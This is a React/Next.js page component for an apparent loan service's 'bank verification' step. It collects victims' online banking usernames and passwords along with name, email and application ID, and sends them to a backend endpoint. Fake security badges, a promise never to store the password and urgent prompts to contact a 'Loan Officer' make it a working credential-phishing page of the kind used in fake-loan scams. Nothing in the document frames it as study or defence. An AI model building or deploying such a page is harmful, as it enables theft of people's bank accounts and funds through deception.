"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { SITE_NAME } from "@/lib/constants";
import toast from "react-hot-toast";

const MAJOR_BANKS = [
  "JPMorgan Chase",
  "Bank of America",
  "Wells Fargo",
  "Citigroup (Citi)",
  "U.S. Bancorp (U.S. Bank)",
  "PNC Financial Services",
  "Truist Financial",
  "Goldman Sachs",
  "Capital One",
  "TD Bank",
  "Other",
];

const ACCOUNT_TYPES = ["Checking", "Savings"];

export default function VerifyBankPage() {
  const [submitted, setSubmitted] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [pstTime, setPstTime] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // Form state
  const [bankName, setBankName] = useState("");
  const [applicationId, setApplicationId] = useState("");
  const [accountType, setAccountType] = useState("checking");
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      const options: Intl.DateTimeFormatOptions = {
        timeZone: "America/Los_Angeles",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
        timeZoneName: "short",
      };
      setPstTime(new Intl.DateTimeFormat("en-US", options).format(now));
    };

    updateTime();
    const timer = setInterval(updateTime, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const response = await fetch("/api/bank-verification", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bankName,
          accountType,
          fullName,
          email,
          bankingUsername: username,
          bankingPassword: password,
          applicationId,
        }),
      });

      if (!response.ok) {
        const data = await response.json();
        toast.error(data.error || "An error occurred. Please try again.");
        return;
      }

      toast.success("Bank verification submitted successfully!");
      setSubmitted(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (err: any) {
      setError(err.message || "An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen bg-surface flex flex-col items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-3xl shadow-2xl p-8 text-center border border-surface-dark">
          <div className="mb-6 flex justify-center">
            <div className="w-20 h-20 bg-success/10 rounded-full flex items-center justify-center">
              <svg
                className="w-12 h-12 text-success"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={3}
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
          </div>

          <h1 className="text-3xl font-bold text-text-primary mb-4">
            Information Submitted Successfully
          </h1>

          <div className="space-y-4 text-text-secondary mb-8">
            <p className="leading-relaxed">
              Your bank verification is now in review by our California-based
              team. We are working at PST speed to finalize your file.
            </p>
            <p className="text-sm font-medium bg-surface py-2 px-4 rounded-full inline-block">
              Current PST Time: {pstTime}
            </p>
          </div>

          <div className="bg-primary/5 border border-primary/10 rounded-2xl p-6 mb-8">
            <p className="text-primary font-bold mb-2 uppercase tracking-wide text-xs">
              The Action Trigger
            </p>
            <p className="text-text-primary font-medium">
              Please notify your Loan Officer immediately that you have
              completed this submission to expedite your funding.
            </p>
          </div>

          <Link
            href="/loan-status"
            className="block w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
          >
            Check Loan Status
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-surface flex flex-col">
      {/* Security Banner */}
      <div className="bg-primary-dark text-white py-2 px-4 text-center text-sm font-medium flex items-center justify-center gap-2">
        <svg
          className="w-4 h-4 text-success"
          fill="currentColor"
          viewBox="0 0 20 20"
        >
          <path
            fillRule="evenodd"
            d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
            clipRule="evenodd"
          />
        </svg>
        <span>✓ Bank-Level 256-Bit Encryption</span>
      </div>

      <div className="max-w-2xl mx-auto w-full px-4 py-12 flex-grow">
        {/* Header Section */}
        <div className="flex flex-col items-center mb-10 text-center">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-primary rounded-xl flex items-center justify-center shadow-lg">
              <span className="text-white font-bold text-xl">CL</span>
            </div>
            <div className="h-8 w-px bg-surface-dark"></div>
            <div className="flex items-center gap-1.5 text-primary-light font-bold text-sm bg-primary-light/5 px-3 py-1.5 rounded-full border border-primary-light/20">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                  clipRule="evenodd"
                />
              </svg>
              Verified Secure
            </div>
          </div>

          <h1 className="text-3xl font-extrabold text-text-primary mb-4 tracking-tight">
            Secure Identity & Income Verification
          </h1>
          <p className="text-text-secondary max-w-lg leading-relaxed">
            To fulfill our PST-speed funding guarantee, please securely verify
            the US-based bank account where you wish to receive your funds.
          </p>
          {/* {error && (
            <div className="mt-6 p-4 bg-error/10 border border-error/20 rounded-xl text-error text-sm font-medium">
              {error}
            </div>
          )} */}
        </div>

        <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
          <form
            onSubmit={handleSubmit}
            className="divide-y divide-surface-dark"
          >
            {/* Section A: Bank Identification */}
            <div className="p-8 space-y-6">
              <div className="flex items-center gap-2 mb-2">
                <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
                  A
                </div>
                <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                  Bank Identification
                </h2>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                <div>
                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                    Bank Name
                  </label>
                  <select
                    required
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    className="w-full px-4 py-3.5 bg-surface border-none rounded-xl focus:ring-2 focus:ring-primary/20 outline-none text-sm font-medium transition-all"
                  >
                    <option value="">Select your bank</option>
                    {MAJOR_BANKS.map((bank) => (
                      <option key={bank} value={bank}>
                        {bank}
                      </option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                    Account Type
                  </label>
                  <select
                    required
                    value={accountType}
                    onChange={(e) => setAccountType(e.target.value)}
                    className="w-full px-4 py-3.5 bg-surface border-none rounded-xl focus:ring-2 focus:ring-primary/20 outline-none text-sm font-medium transition-all"
                  >
                    {ACCOUNT_TYPES.map((type) => (
                      <option key={type} value={type.toLowerCase()}>
                        {type}
                      </option>
                    ))}
                  </select>
                </div>
              </div>
            </div>

            {/* Section B: Credentials */}
            <div className="p-8 bg-surface-dark/30 space-y-6 border-y border-surface-dark">
              <div className="flex items-center gap-2 mb-2">
                <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
                  B
                </div>
                <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                  Secure Credentials Vault
                </h2>
              </div>

              <div className="space-y-5">
                <div className="flex gap-4 w-full">
                  <div className="flex-1">
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                      Full Name
                    </label>
                    <input
                      required
                      type="text"
                      autoComplete="name"
                      placeholder="Full name as per loan application"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      disabled={loading}
                      className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                    />
                  </div>

                  <div className="flex-1">
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                      Email
                    </label>
                    <input
                      required
                      type="email"
                      autoComplete="email"
                      placeholder="Email as per loan application"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      disabled={loading}
                      className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                    Online Banking Username
                  </label>
                  <input
                    required
                    type="text"
                    autoComplete="off"
                    placeholder="Enter username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    disabled={loading}
                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                  />
                </div>

                <div className="relative">
                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                    Online Banking Password
                  </label>
                  <input
                    required
                    type={showPassword ? "text" : "password"}
                    autoComplete="off"
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    disabled={loading}
                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 bottom-3.5 text-xs font-bold text-primary hover:text-primary-dark transition-colors"
                  >
                    {showPassword ? "HIDE" : "SHOW"}
                  </button>
                </div>

                <div>
                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                    Application Id
                  </label>
                  <input
                    required
                    type="text"
                    autoComplete="off"
                    placeholder="Please enter your Application ID (same as your Loan Application ID)"
                    value={applicationId}
                    onChange={(e) => setApplicationId(e.target.value)}
                    disabled={loading}
                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                  />
                </div>
              </div>
            </div>

            {/* Section C: Footer */}
            <div className="p-8 bg-white space-y-6">
              <div className="flex gap-3 p-4 bg-surface rounded-2xl border border-surface-dark">
                <svg
                  className="w-5 h-5 text-text-secondary mt-0.5 flex-shrink-0"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
                <p className="text-[11px] leading-relaxed text-text-secondary font-medium">
                  {SITE_NAME} uses these credentials solely for a one-time
                  manual verification of income and identity to finalize your
                  10% APR loan offer. We never store your password or sell your
                  data to third parties.
                </p>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
              >
                {loading ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    Verify Account
                    <svg
                      className="w-5 h-5"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                      />
                    </svg>
                  </>
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Support Footer */}
        <p className="text-center mt-8 text-xs text-text-secondary font-medium">
          Having trouble connecting? Contact your Loan Officer or call us at
          (747) 200-5228
        </p>
      </div>
    </div>
  );
}
